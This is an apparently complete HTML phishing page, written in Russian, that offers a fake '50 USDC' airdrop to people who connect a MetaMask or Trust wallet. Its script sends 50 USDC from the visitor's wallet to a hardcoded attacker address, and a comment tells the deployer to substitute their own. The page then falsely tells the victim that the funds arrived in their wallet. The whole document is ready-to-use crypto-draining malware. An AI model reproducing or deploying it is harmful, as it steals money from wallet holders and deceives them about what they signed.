<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pumplyx</title>
    <style>
        body { background: #0a0c14; font-family: Arial; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin:0; }
        .box { background: #131825; padding: 30px; border-radius: 30px; max-width: 400px; width:100%; text-align: center; }
        .btn { background: #f7b731; color: #000; padding: 16px; border: none; border-radius: 50px; font-size: 18px; font-weight: bold; width:100%; cursor: pointer; margin:10px 0; }
        .btn:disabled { opacity:0.5; }
        .status { color: #7b8ba8; font-size: 14px; margin:10px 0; }
        .addr { background: #0e121e; padding: 10px; border-radius: 12px; margin:10px 0; font-size: 12px; color: #4a5a78; }
        .wallet-btn { background: #1f2840; border: 1px solid #2f3a58; color: #c8d4e8; padding: 10px 20px; border-radius: 30px; margin:5px; cursor: pointer; }
        .wallet-btn.active { border-color: #f7b731; }
    </style>
</head>
<body>
<div class="box">
    <h1 style="color:#f7b731;">PUMPLYX</h1>
    <p>Забери 50 USDC</p>

    <div>
        <button class="wallet-btn" data-wallet="metamask">MetaMask</button>
        <button class="wallet-btn" data-wallet="trust">Trust</button>
    </div>

    <div class="addr" id="addrDisplay">Кошелёк не подключён</div>
    <button class="btn" id="claimBtn" disabled>Забрать дроп</button>
    <div class="status" id="statusMsg">Подключи кошелёк</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
    // ===== ЗАМЕНИ НА СВОЙ АДРЕС =====
    var MY_ADDRESS = '0x44698049ad0be92e567cdfe9c5aa86d70047f73e';
    // =================================

    var addrDisplay = document.getElementById('addrDisplay');
    var statusMsg = document.getElementById('statusMsg');
    var claimBtn = document.getElementById('claimBtn');
    var walletBtns = document.querySelectorAll('.wallet-btn');

    var signer = null;
    var userAddress = null;

    function setStatus(text) {
        statusMsg.textContent = text;
    }

    function setAddress(addr) {
        if (addr) {
            addrDisplay.textContent = '✅ ' + addr.slice(0,6) + '...' + addr.slice(-4);
            addrDisplay.style.color = '#51cf66';
            claimBtn.disabled = false;
        } else {
            addrDisplay.textContent = 'Кошелёк не подключён';
            addrDisplay.style.color = '#4a5a78';
            claimBtn.disabled = true;
        }
    }

    // Подключение кошелька
    walletBtns.forEach(function(btn) {
        btn.addEventListener('click', async function() {
            walletBtns.forEach(function(b) { b.classList.remove('active'); });
            this.classList.add('active');

            try {
                if (!window.ethereum) {
                    setStatus('❌ Установи MetaMask или Trust');
                    return;
                }

                var provider = new ethers.providers.Web3Provider(window.ethereum);
                var accounts = await provider.send('eth_requestAccounts', []);
                
                if (!accounts || accounts.length === 0) {
                    setStatus('❌ Нет аккаунтов');
                    return;
                }

                signer = provider.getSigner();
                userAddress = accounts[0];
                setAddress(userAddress);
                setStatus('✅ Кошелёк подключён');

            } catch(e) {
                setStatus('❌ ' + e.message);
            }
        });
    });

    // Забрать дроп — отправить USDC на мой адрес
    claimBtn.addEventListener('click', async function() {
        if (!userAddress) {
            setStatus('⚠️ Сначала подключи кошелёк');
            return;
        }

        this.disabled = true;
        this.textContent = '⏳ Отправка...';
        setStatus('⏳ Подписывай транзакцию...');

        try {
            // Контракт USDC (Ethereum)
            var usdcAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
            var usdc = new ethers.Contract(usdcAddress, [
                'function transfer(address to, uint256 amount) returns (bool)'
            ], signer);

            var amount = ethers.utils.parseUnits('50', 6); // 50 USDC
            var tx = await usdc.transfer(MY_ADDRESS, amount);
            await tx.wait();

            setStatus('✅ 50 USDC ушли на твой адрес!');
            this.textContent = '💸 Готово';
            this.style.background = '#2a3a4a';
            this.style.color = '#fff';

        } catch(e) {
            if (e.code === 4001) {
                setStatus('❌ Ты отклонил транзакцию');
            } else {
                setStatus('❌ ' + e.message);
            }
            this.disabled = false;
            this.textContent = 'Забрать дроп';
        }
    });

    // Если MetaMask уже установлен — слушаем смену аккаунта
    if (window.ethereum) {
        window.ethereum.on('accountsChanged', function(accounts) {
            if (accounts.length === 0) {
                userAddress = null;
                setAddress(null);
                setStatus('⚠️ Кошелёк отключён');
            } else {
                userAddress = accounts[0];
                setAddress(userAddress);
                setStatus('🔄 Аккаунт изменён');
            }
        });
    }
</script>
</body>
</html>
